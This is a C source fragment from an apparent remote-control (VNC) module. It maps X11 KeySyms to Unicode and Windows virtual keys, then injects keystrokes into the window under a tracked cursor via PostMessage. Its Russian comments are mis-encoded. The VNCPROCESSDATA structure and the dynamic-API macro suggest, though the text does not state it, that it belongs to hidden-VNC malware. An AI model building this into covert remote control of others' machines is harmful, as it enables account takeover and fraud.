  {0x0dad, 0x0e0d}, /*                 Thai_yoying ‡∏ç THAI CHARACTER YO YING */
  {0x0dae, 0x0e0e}, /*                Thai_dochada ‡∏é THAI CHARACTER DO CHADA */
  {0x0daf, 0x0e0f}, /*                Thai_topatak ‡∏è THAI CHARACTER TO PATAK */
  {0x0db0, 0x0e10}, /*                Thai_thothan ‡∏ê THAI CHARACTER THO THAN */
  {0x0db1, 0x0e11}, /*          Thai_thonangmontho ‡∏ë THAI CHARACTER THO NANGMONTHO */
  {0x0db2, 0x0e12}, /*             Thai_thophuthao ‡∏í THAI CHARACTER THO PHUTHAO */
  {0x0db3, 0x0e13}, /*                  Thai_nonen ‡∏ì THAI CHARACTER NO NEN */
  {0x0db4, 0x0e14}, /*                  Thai_dodek ‡∏î THAI CHARACTER DO DEK */
  {0x0db5, 0x0e15}, /*                  Thai_totao ‡∏ï THAI CHARACTER TO TAO */
  {0x0db6, 0x0e16}, /*               Thai_thothung ‡∏ñ THAI CHARACTER THO THUNG */
  {0x0db7, 0x0e17}, /*              Thai_thothahan ‡∏ó THAI CHARACTER THO THAHAN */
  {0x0db8, 0x0e18}, /*               Thai_thothong ‡∏ò THAI CHARACTER THO THONG */
  {0x0db9, 0x0e19}, /*                   Thai_nonu ‡∏ô THAI CHARACTER NO NU */
  {0x0dba, 0x0e1a}, /*               Thai_bobaimai ‡∏ö THAI CHARACTER BO BAIMAI */
  {0x0dbb, 0x0e1b}, /*                  Thai_popla ‡∏õ THAI CHARACTER PO PLA */
  {0x0dbc, 0x0e1c}, /*               Thai_phophung ‡∏ú THAI CHARACTER PHO PHUNG */
  {0x0dbd, 0x0e1d}, /*                   Thai_fofa ‡∏ù THAI CHARACTER FO FA */
  {0x0dbe, 0x0e1e}, /*                Thai_phophan ‡∏û THAI CHARACTER PHO PHAN */
  {0x0dbf, 0x0e1f}, /*                  Thai_fofan ‡∏ü THAI CHARACTER FO FAN */
  {0x0dc0, 0x0e20}, /*             Thai_phosamphao ‡∏† THAI CHARACTER PHO SAMPHAO */
  {0x0dc1, 0x0e21}, /*                   Thai_moma ‡∏° THAI CHARACTER MO MA */
  {0x0dc2, 0x0e22}, /*                  Thai_yoyak ‡∏¢ THAI CHARACTER YO YAK */
  {0x0dc3, 0x0e23}, /*                  Thai_rorua ‡∏£ THAI CHARACTER RO RUA */
  {0x0dc4, 0x0e24}, /*                     Thai_ru ‡∏§ THAI CHARACTER RU */
  {0x0dc5, 0x0e25}, /*                 Thai_loling ‡∏• THAI CHARACTER LO LING */
  {0x0dc6, 0x0e26}, /*                     Thai_lu ‡∏¶ THAI CHARACTER LU */
  {0x0dc7, 0x0e27}, /*                 Thai_wowaen ‡∏ß THAI CHARACTER WO WAEN */
  {0x0dc8, 0x0e28}, /*                 Thai_sosala ‡∏® THAI CHARACTER SO SALA */
  {0x0dc9, 0x0e29}, /*                 Thai_sorusi ‡∏© THAI CHARACTER SO RUSI */
  {0x0dca, 0x0e2a}, /*                  Thai_sosua ‡∏™ THAI CHARACTER SO SUA */
  {0x0dcb, 0x0e2b}, /*                  Thai_hohip ‡∏´ THAI CHARACTER HO HIP */
  {0x0dcc, 0x0e2c}, /*                Thai_lochula ‡∏¨ THAI CHARACTER LO CHULA */
  {0x0dcd, 0x0e2d}, /*                   Thai_oang ‡∏≠ THAI CHARACTER O ANG */
  {0x0dce, 0x0e2e}, /*               Thai_honokhuk ‡∏Æ THAI CHARACTER HO NOKHUK */
  {0x0dcf, 0x0e2f}, /*              Thai_paiyannoi ‡∏Ø THAI CHARACTER PAIYANNOI */
  {0x0dd0, 0x0e30}, /*                  Thai_saraa ‡∏∞ THAI CHARACTER SARA A */
  {0x0dd1, 0x0e31}, /*             Thai_maihanakat ‡∏± THAI CHARACTER MAI HAN-AKAT */
  {0x0dd2, 0x0e32}, /*                 Thai_saraaa ‡∏≤ THAI CHARACTER SARA AA */
  {0x0dd3, 0x0e33}, /*                 Thai_saraam ‡∏≥ THAI CHARACTER SARA AM */
  {0x0dd4, 0x0e34}, /*                  Thai_sarai ‡∏¥ THAI CHARACTER SARA I */
  {0x0dd5, 0x0e35}, /*                 Thai_saraii ‡∏µ THAI CHARACTER SARA II */
  {0x0dd6, 0x0e36}, /*                 Thai_saraue ‡∏∂ THAI CHARACTER SARA UE */
  {0x0dd7, 0x0e37}, /*                Thai_sarauee ‡∏∑ THAI CHARACTER SARA UEE */
  {0x0dd8, 0x0e38}, /*                  Thai_sarau ‡∏∏ THAI CHARACTER SARA U */
  {0x0dd9, 0x0e39}, /*                 Thai_sarauu ‡∏π THAI CHARACTER SARA UU */
  {0x0dda, 0x0e3a}, /*                Thai_phinthu ‡∏∫ THAI CHARACTER PHINTHU */
  {0x0dde, 0x0e3e}, /*      Thai_maihanakat_maitho ‡∏æ ??? */
  {0x0ddf, 0x0e3f}, /*                   Thai_baht ‡∏ø THAI CURRENCY SYMBOL BAHT */
  {0x0de0, 0x0e40}, /*                  Thai_sarae ‡πÄ THAI CHARACTER SARA E */
  {0x0de1, 0x0e41}, /*                 Thai_saraae ‡πÅ THAI CHARACTER SARA AE */
  {0x0de2, 0x0e42}, /*                  Thai_sarao ‡πÇ THAI CHARACTER SARA O */
  {0x0de3, 0x0e43}, /*          Thai_saraaimaimuan ‡πÉ THAI CHARACTER SARA AI MAIMUAN */
  {0x0de4, 0x0e44}, /*         Thai_saraaimaimalai ‡πÑ THAI CHARACTER SARA AI MAIMALAI */
  {0x0de5, 0x0e45}, /*            Thai_lakkhangyao ‡πÖ THAI CHARACTER LAKKHANGYAO */
  {0x0de6, 0x0e46}, /*               Thai_maiyamok ‡πÜ THAI CHARACTER MAIYAMOK */
  {0x0de7, 0x0e47}, /*              Thai_maitaikhu ‡πá THAI CHARACTER MAITAIKHU */
  {0x0de8, 0x0e48}, /*                  Thai_maiek ‡πà THAI CHARACTER MAI EK */
  {0x0de9, 0x0e49}, /*                 Thai_maitho ‡πâ THAI CHARACTER MAI THO */
  {0x0dea, 0x0e4a}, /*                 Thai_maitri ‡πä THAI CHARACTER MAI TRI */
  {0x0deb, 0x0e4b}, /*            Thai_maichattawa ‡πã THAI CHARACTER MAI CHATTAWA */
  {0x0dec, 0x0e4c}, /*            Thai_thanthakhat ‡πå THAI CHARACTER THANTHAKHAT */
  {0x0ded, 0x0e4d}, /*               Thai_nikhahit ‡πç THAI CHARACTER NIKHAHIT */
  {0x0df0, 0x0e50}, /*                 Thai_leksun ‡πê THAI DIGIT ZERO */
  {0x0df1, 0x0e51}, /*                Thai_leknung ‡πë THAI DIGIT ONE */
  {0x0df2, 0x0e52}, /*                Thai_leksong ‡πí THAI DIGIT TWO */
  {0x0df3, 0x0e53}, /*                 Thai_leksam ‡πì THAI DIGIT THREE */
  {0x0df4, 0x0e54}, /*                  Thai_leksi ‡πî THAI DIGIT FOUR */
  {0x0df5, 0x0e55}, /*                  Thai_lekha ‡πï THAI DIGIT FIVE */
  {0x0df6, 0x0e56}, /*                 Thai_lekhok ‡πñ THAI DIGIT SIX */
  {0x0df7, 0x0e57}, /*                Thai_lekchet ‡πó THAI DIGIT SEVEN */
  {0x0df8, 0x0e58}, /*                Thai_lekpaet ‡πò THAI DIGIT EIGHT */
  {0x0df9, 0x0e59}, /*                 Thai_lekkao ‡πô THAI DIGIT NINE */
  {0x0ea1, 0x3131}, /*               Hangul_Kiyeog „Ñ± HANGUL LETTER KIYEOK */
  {0x0ea2, 0x3132}, /*          Hangul_SsangKiyeog „Ñ≤ HANGUL LETTER SSANGKIYEOK */
  {0x0ea3, 0x3133}, /*           Hangul_KiyeogSios „Ñ≥ HANGUL LETTER KIYEOK-SIOS */
  {0x0ea4, 0x3134}, /*                Hangul_Nieun „Ñ¥ HANGUL LETTER NIEUN */
  {0x0ea5, 0x3135}, /*           Hangul_NieunJieuj „Ñµ HANGUL LETTER NIEUN-CIEUC */
  {0x0ea6, 0x3136}, /*           Hangul_NieunHieuh „Ñ∂ HANGUL LETTER NIEUN-HIEUH */
  {0x0ea7, 0x3137}, /*               Hangul_Dikeud „Ñ∑ HANGUL LETTER TIKEUT */
  {0x0ea8, 0x3138}, /*          Hangul_SsangDikeud „Ñ∏ HANGUL LETTER SSANGTIKEUT */
  {0x0ea9, 0x3139}, /*                Hangul_Rieul „Ñπ HANGUL LETTER RIEUL */
  {0x0eaa, 0x313a}, /*          Hangul_RieulKiyeog „Ñ∫ HANGUL LETTER RIEUL-KIYEOK */
  {0x0eab, 0x313b}, /*           Hangul_RieulMieum „Ñª HANGUL LETTER RIEUL-MIEUM */
  {0x0eac, 0x313c}, /*           Hangul_RieulPieub „Ñº HANGUL LETTER RIEUL-PIEUP */
  {0x0ead, 0x313d}, /*            Hangul_RieulSios „ÑΩ HANGUL LETTER RIEUL-SIOS */
  {0x0eae, 0x313e}, /*           Hangul_RieulTieut „Ñæ HANGUL LETTER RIEUL-THIEUTH */
  {0x0eaf, 0x313f}, /*          Hangul_RieulPhieuf „Ñø HANGUL LETTER RIEUL-PHIEUPH */
  {0x0eb0, 0x3140}, /*           Hangul_RieulHieuh „ÖÄ HANGUL LETTER RIEUL-HIEUH */
  {0x0eb1, 0x3141}, /*                Hangul_Mieum „ÖÅ HANGUL LETTER MIEUM */
  {0x0eb2, 0x3142}, /*                Hangul_Pieub „ÖÇ HANGUL LETTER PIEUP */
  {0x0eb3, 0x3143}, /*           Hangul_SsangPieub „ÖÉ HANGUL LETTER SSANGPIEUP */
  {0x0eb4, 0x3144}, /*            Hangul_PieubSios „ÖÑ HANGUL LETTER PIEUP-SIOS */
  {0x0eb5, 0x3145}, /*                 Hangul_Sios „ÖÖ HANGUL LETTER SIOS */
  {0x0eb6, 0x3146}, /*            Hangul_SsangSios „ÖÜ HANGUL LETTER SSANGSIOS */
  {0x0eb7, 0x3147}, /*                Hangul_Ieung „Öá HANGUL LETTER IEUNG */
  {0x0eb8, 0x3148}, /*                Hangul_Jieuj „Öà HANGUL LETTER CIEUC */
  {0x0eb9, 0x3149}, /*           Hangul_SsangJieuj „Öâ HANGUL LETTER SSANGCIEUC */
  {0x0eba, 0x314a}, /*                Hangul_Cieuc „Öä HANGUL LETTER CHIEUCH */
  {0x0ebb, 0x314b}, /*               Hangul_Khieuq „Öã HANGUL LETTER KHIEUKH */
  {0x0ebc, 0x314c}, /*                Hangul_Tieut „Öå HANGUL LETTER THIEUTH */
  {0x0ebd, 0x314d}, /*               Hangul_Phieuf „Öç HANGUL LETTER PHIEUPH */
  {0x0ebe, 0x314e}, /*                Hangul_Hieuh „Öé HANGUL LETTER HIEUH */
  {0x0ebf, 0x314f}, /*                    Hangul_A „Öè HANGUL LETTER A */
  {0x0ec0, 0x3150}, /*                   Hangul_AE „Öê HANGUL LETTER AE */
  {0x0ec1, 0x3151}, /*                   Hangul_YA „Öë HANGUL LETTER YA */
  {0x0ec2, 0x3152}, /*                  Hangul_YAE „Öí HANGUL LETTER YAE */
  {0x0ec3, 0x3153}, /*                   Hangul_EO „Öì HANGUL LETTER EO */
  {0x0ec4, 0x3154}, /*                    Hangul_E „Öî HANGUL LETTER E */
  {0x0ec5, 0x3155}, /*                  Hangul_YEO „Öï HANGUL LETTER YEO */
  {0x0ec6, 0x3156}, /*                   Hangul_YE „Öñ HANGUL LETTER YE */
  {0x0ec7, 0x3157}, /*                    Hangul_O „Öó HANGUL LETTER O */
  {0x0ec8, 0x3158}, /*                   Hangul_WA „Öò HANGUL LETTER WA */
  {0x0ec9, 0x3159}, /*                  Hangul_WAE „Öô HANGUL LETTER WAE */
  {0x0eca, 0x315a}, /*                   Hangul_OE „Öö HANGUL LETTER OE */
  {0x0ecb, 0x315b}, /*                   Hangul_YO „Öõ HANGUL LETTER YO */
  {0x0ecc, 0x315c}, /*                    Hangul_U „Öú HANGUL LETTER U */
  {0x0ecd, 0x315d}, /*                  Hangul_WEO „Öù HANGUL LETTER WEO */
  {0x0ece, 0x315e}, /*                   Hangul_WE „Öû HANGUL LETTER WE */
  {0x0ecf, 0x315f}, /*                   Hangul_WI „Öü HANGUL LETTER WI */
  {0x0ed0, 0x3160}, /*                   Hangul_YU „Ö† HANGUL LETTER YU */
  {0x0ed1, 0x3161}, /*                   Hangul_EU „Ö° HANGUL LETTER EU */
  {0x0ed2, 0x3162}, /*                   Hangul_YI „Ö¢ HANGUL LETTER YI */
  {0x0ed3, 0x3163}, /*                    Hangul_I „Ö£ HANGUL LETTER I */
  {0x0ed4, 0x11a8}, /*             Hangul_J_Kiyeog ·Ü® HANGUL JONGSEONG KIYEOK */
  {0x0ed5, 0x11a9}, /*        Hangul_J_SsangKiyeog ·Ü© HANGUL JONGSEONG SSANGKIYEOK */
  {0x0ed6, 0x11aa}, /*         Hangul_J_KiyeogSios ·Ü™ HANGUL JONGSEONG KIYEOK-SIOS */
  {0x0ed7, 0x11ab}, /*              Hangul_J_Nieun ·Ü´ HANGUL JONGSEONG NIEUN */
  {0x0ed8, 0x11ac}, /*         Hangul_J_NieunJieuj ·Ü¨ HANGUL JONGSEONG NIEUN-CIEUC */
  {0x0ed9, 0x11ad}, /*         Hangul_J_NieunHieuh ·Ü≠ HANGUL JONGSEONG NIEUN-HIEUH */
  {0x0eda, 0x11ae}, /*             Hangul_J_Dikeud ·ÜÆ HANGUL JONGSEONG TIKEUT */
  {0x0edb, 0x11af}, /*              Hangul_J_Rieul ·ÜØ HANGUL JONGSEONG RIEUL */
  {0x0edc, 0x11b0}, /*        Hangul_J_RieulKiyeog ·Ü∞ HANGUL JONGSEONG RIEUL-KIYEOK */
  {0x0edd, 0x11b1}, /*         Hangul_J_RieulMieum ·Ü± HANGUL JONGSEONG RIEUL-MIEUM */
  {0x0ede, 0x11b2}, /*         Hangul_J_RieulPieub ·Ü≤ HANGUL JONGSEONG RIEUL-PIEUP */
  {0x0edf, 0x11b3}, /*          Hangul_J_RieulSios ·Ü≥ HANGUL JONGSEONG RIEUL-SIOS */
  {0x0ee0, 0x11b4}, /*         Hangul_J_RieulTieut ·Ü¥ HANGUL JONGSEONG RIEUL-THIEUTH */
  {0x0ee1, 0x11b5}, /*        Hangul_J_RieulPhieuf ·Üµ HANGUL JONGSEONG RIEUL-PHIEUPH */
  {0x0ee2, 0x11b6}, /*         Hangul_J_RieulHieuh ·Ü∂ HANGUL JONGSEONG RIEUL-HIEUH */
  {0x0ee3, 0x11b7}, /*              Hangul_J_Mieum ·Ü∑ HANGUL JONGSEONG MIEUM */
  {0x0ee4, 0x11b8}, /*              Hangul_J_Pieub ·Ü∏ HANGUL JONGSEONG PIEUP */
  {0x0ee5, 0x11b9}, /*          Hangul_J_PieubSios ·Üπ HANGUL JONGSEONG PIEUP-SIOS */
  {0x0ee6, 0x11ba}, /*               Hangul_J_Sios ·Ü∫ HANGUL JONGSEONG SIOS */
  {0x0ee7, 0x11bb}, /*          Hangul_J_SsangSios ·Üª HANGUL JONGSEONG SSANGSIOS */
  {0x0ee8, 0x11bc}, /*              Hangul_J_Ieung ·Üº HANGUL JONGSEONG IEUNG */
  {0x0ee9, 0x11bd}, /*              Hangul_J_Jieuj ·ÜΩ HANGUL JONGSEONG CIEUC */
  {0x0eea, 0x11be}, /*              Hangul_J_Cieuc ·Üæ HANGUL JONGSEONG CHIEUCH */
  {0x0eeb, 0x11bf}, /*             Hangul_J_Khieuq ·Üø HANGUL JONGSEONG KHIEUKH */
  {0x0eec, 0x11c0}, /*              Hangul_J_Tieut ·áÄ HANGUL JONGSEONG THIEUTH */
  {0x0eed, 0x11c1}, /*             Hangul_J_Phieuf ·áÅ HANGUL JONGSEONG PHIEUPH */
  {0x0eee, 0x11c2}, /*              Hangul_J_Hieuh ·áÇ HANGUL JONGSEONG HIEUH */
  {0x0eef, 0x316d}, /*     Hangul_RieulYeorinHieuh „Ö≠ HANGUL LETTER RIEUL-YEORINHIEUH */
  {0x0ef0, 0x3171}, /*    Hangul_SunkyeongeumMieum „Ö± HANGUL LETTER KAPYEOUNMIEUM */
  {0x0ef1, 0x3178}, /*    Hangul_SunkyeongeumPieub „Ö∏ HANGUL LETTER KAPYEOUNPIEUP */
  {0x0ef2, 0x317f}, /*              Hangul_PanSios „Öø HANGUL LETTER PANSIOS */
  {0x0ef3, 0x3181}, /*    Hangul_KkogjiDalrinIeung „ÜÅ HANGUL LETTER YESIEUNG */
  {0x0ef4, 0x3184}, /*   Hangul_SunkyeongeumPhieuf „ÜÑ HANGUL LETTER KAPYEOUNPHIEUPH */
  {0x0ef5, 0x3186}, /*          Hangul_YeorinHieuh „ÜÜ HANGUL LETTER YEORINHIEUH */
  {0x0ef6, 0x318d}, /*                Hangul_AraeA „Üç HANGUL LETTER ARAEA */
  {0x0ef7, 0x318e}, /*               Hangul_AraeAE „Üé HANGUL LETTER ARAEAE */
  {0x0ef8, 0x11eb}, /*            Hangul_J_PanSios ·á´ HANGUL JONGSEONG PANSIOS */
  {0x0ef9, 0x11f0}, /*  Hangul_J_KkogjiDalrinIeung ·á∞ HANGUL JONGSEONG YESIEUNG */
  {0x0efa, 0x11f9}, /*        Hangul_J_YeorinHieuh ·áπ HANGUL JONGSEONG YEORINHIEUH */
  {0x0eff, 0x20a9}, /*                  Korean_Won ‚Ç© WON SIGN */
  {0x13a4, 0x20ac}, /*                        Euro ‚Ç¨ EURO SIGN */
  {0x13bc, 0x0152}, /*                          OE ≈í LATIN CAPITAL LIGATURE OE */
  {0x13bd, 0x0153}, /*                          oe ≈ì LATIN SMALL LIGATURE OE */
  {0x13be, 0x0178}, /*                  Ydiaeresis ≈∏ LATIN CAPITAL LETTER Y WITH DIAERESIS */
  {0x20a0, 0x20a0}, /*                     EcuSign ‚Ç† EURO-CURRENCY SIGN */
  {0x20a1, 0x20a1}, /*                   ColonSign ‚Ç° COLON SIGN */
  {0x20a2, 0x20a2}, /*                CruzeiroSign ‚Ç¢ CRUZEIRO SIGN */
  {0x20a3, 0x20a3}, /*                  FFrancSign ‚Ç£ FRENCH FRANC SIGN */
  {0x20a4, 0x20a4}, /*                    LiraSign ‚Ç§ LIRA SIGN */
  {0x20a5, 0x20a5}, /*                    MillSign ‚Ç• MILL SIGN */
  {0x20a6, 0x20a6}, /*                   NairaSign ‚Ç¶ NAIRA SIGN */
  {0x20a7, 0x20a7}, /*                  PesetaSign ‚Çß PESETA SIGN */
  {0x20a8, 0x20a8}, /*                   RupeeSign ‚Ç® RUPEE SIGN */
  {0x20a9, 0x20a9}, /*                     WonSign ‚Ç© WON SIGN */
  {0x20aa, 0x20aa}, /*               NewSheqelSign ‚Ç™ NEW SHEQEL SIGN */
  {0x20ab, 0x20ab}, /*                    DongSign ‚Ç´ DONG SIGN */
  {0x20ac, 0x20ac}, /*                    EuroSign ‚Ç¨ EURO SIGN */
};

/*
   ÓÌ‚ÂÚ‡ˆËˇ KeySym ‚ Unicode.

  IN keySym - KeySym.

  Return    - ÒËÏ‚ÓÎ, ËÎË 0 - ÂÒÎË ÒËÏ‚ÓÎ ÌÂ ÒÛ˘ÂÚ‚ÛÂÚ.
*/
static WCHAR keySymToUnciode(DWORD keySym)
{
  //First check for Latin-1 characters (1:1 mapping).
  if((keySym >= 0x0020 && keySym <= 0x007e) || (keySym >= 0x00a0 && keySym <= 0x00ff))return (WCHAR)keySym;

  //Also check for directly encoded 24-bit UCS characters.
  if((keySym & 0xff000000) == 0x01000000)return (WCHAR)(keySym & 0x00ffffff);

  int minVal = 0;
  int maxVal = sizeof(keySymToUnicodeTable) / sizeof(keySymToUnicodeTable[0]) - 1;
  int midVal;

  //Binary search in table.
  while(maxVal >= minVal)
  {
    midVal = (minVal + maxVal) / 2;
    if(keySymToUnicodeTable[midVal].keySym < keySym)minVal = midVal + 1;
    else if (keySymToUnicodeTable[midVal].keySym > keySym)maxVal = midVal - 1;
    else return keySymToUnicodeTable[midVal].unicode;
  }

  return 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////
//  ÓÌ‚ÂÚ‡ˆËˇ KeySym -> VirtualKey.
// Õ‡ ÓÒÌÓ‚Â UltraVNC.
////////////////////////////////////////////////////////////////////////////////////////////////////

#define XK_MISCELLANY
#define XK_LATIN1
#include <X11\keysymdef.h>

static const struct
{
  DWORD keySym;
  BYTE virtualKey;
  bool extended;
}keySymToVirtualKeyTable[] =
{
  {XK_BackSpace,        VK_BACK,      false},
  {XK_Tab,              VK_TAB,       false},
  {XK_Clear,            VK_CLEAR,     false},
  {XK_Return,           VK_RETURN,    false},
  {XK_Pause,            VK_PAUSE,     false},
  {XK_Escape,           VK_ESCAPE,    false},
  {XK_Delete,           VK_DELETE,    true},

  {XK_Home,             VK_HOME,      true},
  {XK_Left,             VK_LEFT,      true},
  {XK_Up,               VK_UP,        true},
  {XK_Right,            VK_RIGHT,     true},
  {XK_Down,             VK_DOWN,      true},
  {XK_Page_Up,          VK_PRIOR,     true},
  {XK_Page_Down,        VK_NEXT,      true} ,
  {XK_End,              VK_END,       true},

  {XK_Select,           VK_SELECT,    false},
  {XK_Print,            VK_SNAPSHOT,  false},
  {XK_Execute,          VK_EXECUTE,   false},
  {XK_Insert,           VK_INSERT,    true},
  {XK_Help,             VK_HELP,      false},
  {XK_Break,            VK_CANCEL,    true},

  {XK_KP_Space,         VK_SPACE,     false},
  {XK_KP_Tab,           VK_TAB,       false},
  {XK_KP_Enter,         VK_RETURN,    true},
  {XK_KP_F1,            VK_F1,        false},
  {XK_KP_F2,            VK_F2,        false},
  {XK_KP_F3,            VK_F3,        false},
  {XK_KP_F4,            VK_F4,        false},
  {XK_KP_Home,          VK_HOME,      false},
  {XK_KP_Left,          VK_LEFT,      false},
  {XK_KP_Up,            VK_UP,        false},
  {XK_KP_Right,         VK_RIGHT,     false},
  {XK_KP_Down,          VK_DOWN,      false},
  {XK_KP_End,           VK_END,       false},
  {XK_KP_Page_Up,       VK_PRIOR,     false},
  {XK_KP_Page_Down,     VK_NEXT,      false},
  {XK_KP_Begin,         VK_CLEAR,     false},
  {XK_KP_Insert,        VK_INSERT,    false},
  {XK_KP_Delete,        VK_DELETE,    false},
  {XK_KP_Multiply,      VK_MULTIPLY,  false},
  {XK_KP_Add,           VK_ADD,       false},
  {XK_KP_Separator,     VK_SEPARATOR, false},
  {XK_KP_Subtract,      VK_SUBTRACT,  false},
  {XK_KP_Decimal,       VK_DECIMAL,   false},
  {XK_KP_Divide,        VK_DIVIDE,    true},

  {XK_KP_0,             VK_NUMPAD0,   false},
  {XK_KP_1,             VK_NUMPAD1,   false},
  {XK_KP_2,             VK_NUMPAD2,   false},
  {XK_KP_3,             VK_NUMPAD3,   false},
  {XK_KP_4,             VK_NUMPAD4,   false},
  {XK_KP_5,             VK_NUMPAD5,   false},
  {XK_KP_6,             VK_NUMPAD6,   false},
  {XK_KP_7,             VK_NUMPAD7,   false},
  {XK_KP_8,             VK_NUMPAD8,   false},
  {XK_KP_9,             VK_NUMPAD9,   false},

  {XK_F1,               VK_F1,        false},
  {XK_F2,               VK_F2,        false},
  {XK_F3,               VK_F3,        false},
  {XK_F4,               VK_F4,        false},
  {XK_F5,               VK_F5,        false},
  {XK_F6,               VK_F6,        false},
  {XK_F7,               VK_F7,        false},
  {XK_F8,               VK_F8,        false},
  {XK_F9,               VK_F9,        false},
  {XK_F10,              VK_F10,       false},
  {XK_F11,              VK_F11,       false},
  {XK_F12,              VK_F12,       false},
  {XK_F13,              VK_F13,       false},
  {XK_F14,              VK_F14,       false},
  {XK_F15,              VK_F15,       false},
  {XK_F16,              VK_F16,       false},
  {XK_F17,              VK_F17,       false},
  {XK_F18,              VK_F18,       false},
  {XK_F19,              VK_F19,       false},
  {XK_F20,              VK_F20,       false},
  {XK_F21,              VK_F21,       false},
  {XK_F22,              VK_F22,       false},
  {XK_F23,              VK_F23,       false},
  {XK_F24,              VK_F24,       false},

  {XK_Shift_L,          VK_LSHIFT,    false},
  {XK_Shift_R,          VK_RSHIFT,    false},
  {XK_Control_L,        VK_LCONTROL,  false},
  {XK_Control_R,        VK_RCONTROL,  true},
  {XK_Alt_L,            VK_LMENU,     false},
  {XK_Alt_R,            VK_RMENU,     true},

  {XK_Super_L,          VK_LWIN,      false}, 
  {XK_Super_R,          VK_RWIN,      false}, 
  {XK_Menu,             VK_APPS,      false}, 
};

/*
   ÓÌ‚ÂÚ‡ˆËˇ KeySym ‚ VirtualKey.

  IN keySym - KeySym.

  Return    - ‚ ÒÎÛ˜‡Ë ÛÒÔÂı‡:
                LOBYTE - VirtualKey,
                HIBYTE - 1 - ‡Ò¯ËÂÌ‡ˇ ÍÎ‡‚‡¯Ë, 0 ÌÂ ‡Ò¯ËÂÌ‡ˇ,
              ËÎË 0 - ÂÒÎË ÍÓ‰ ÌÂ Ì‡È‰ÂÌ.
*/
static WORD keySymToVirtualKey(DWORD keySym)
{
  for(BYTE i = 0; i < sizeof(keySymToVirtualKeyTable) / sizeof(keySymToVirtualKeyTable[0]); i++)if(keySymToVirtualKeyTable[i].keySym == keySym)
  {
    return MAKEWORD(keySymToVirtualKeyTable[i].virtualKey, keySymToVirtualKeyTable[i].extended);
  }
  return 0;
}

////////////////////////////////////////////////////////////////////////////////////////////////////

/*
  »ÒÔÓÎÌÂÌËÂ KeySym.

  IN OUT vncProcessData - VNCPROCESSDATA.
  IN window             - ÓÍÌÓ, ÍÓÚÓÓÏÛ ÌÛÊÌÓ ÓÚÔ‡‚ËÚ¸ ÒÓÓ·˘ÂÌËÂ. ÕÂ ÏÓÊÂÚ ·˚Ú¸ NULL.
  IN keySym             - KeySym.
  IN down               - true - Ì‡Ê‡ÚËÂ, false - ÓÚÔÒÛÍ‡ÌËÂ.
*/
static bool executeKeySym(VNCPROCESSDATA *vncProcessData, HWND window, DWORD keySym, bool down)
{
  DWORD lParam      = down  ? 0 : ((1 << 31) | (1 << 30));
  WORD virtualCode  = keySymToVirtualKey(keySym);
  
  //≈ÒÎË virtualCode Ì‡È‰ÂÌ.
  if(virtualCode != 0)
  {
    //Œ·ÌÓ‚ÎˇÂÏ ÒÓÒÚˇÌËÂ ÍÎ‡‚Ë‡ÚÛ˚.
    updateInputState(vncProcessData, LOBYTE(virtualCode), down); //“.Â. ÌÂ Ó·ÌÓ‚ÎˇÂÏ ÒÓÒÚÓˇÌËÂ ÒËÏ‚ÓÎ¸Ì˚ı ÍÎ‡‚Ë¯.

    //—Í‡Ì-ÍÓ‰.
    UINT scanCode = CWA(user32, MapVirtualKeyW)(LOBYTE(virtualCode), MAPVK_VK_TO_VSC);
    if(scanCode != 0)lParam |= ((scanCode & 0xff) << 16);

    //–‡Ò¯ËÂÌË‡ˇ ÍÎ‡‚Ë¯‡.
    if(HIWORD(virtualCode) == 1)lParam |= (1 << 24);

    bool isSysKey = ((vncProcessData->globalData->keysState[VK_MENU] & 0x80) && (vncProcessData->globalData->keysState[VK_CONTROL] & 0x80) == 0);
    
    //WM_CHAR ·Û‰ÂÚ ÔÓÒÎ‡Ì ‡‚ÚÓÏ‡ÚË˜ÂÒÍË ˜ÂÂÁ TranslateMessage, ÂÒÎË ÓÍÌÛ ˝ÚÓ Ì‡‰‡.
    return(CWA(user32, PostMessageW)(window,
                                     down ? (isSysKey ? WM_SYSKEYDOWN : WM_KEYDOWN) : (isSysKey ? WM_SYSKEYUP : WM_KEYUP),
                                     (WPARAM)LOBYTE(virtualCode),
                                     (LPARAM)lParam) != FALSE
                                    );
  }
  
  //≈ÒÎË ˛ÌËÍÓ‰Ó‚È ÒËÏ‚ÓÎ Ì‡È‰ÂÌ, ÓÚÔ‡‚ÎˇÂÏ WM_CHAR.
  WCHAR unicodeChar;
  if(down && (unicodeChar = keySymToUnciode(keySym)) != 0)
  {
    if(vncProcessData->globalData->keysState[VK_MENU] & 0x80)lParam |= (1 << 29);
    return(CWA(user32, PostMessageW)(window, WM_CHAR, (WPARAM)unicodeChar, (LPARAM)lParam) != FALSE);
  }

  return false;
}


void keyboardMessage(VNCPROCESSDATA *vncProcessData, DWORD keySym, bool down)
{
  POINT point;
  point.x = vncProcessData->globalData->cursorPoint.x;
  point.y = vncProcessData->globalData->cursorPoint.y;
  
  HWND window = Gui::_windowFromPoint(point, SENDMESSAGE_TIMEOUT, NULL);
  if(window != NULL)executeKeySym(vncProcessData, window, keySym, down);
}
#endif
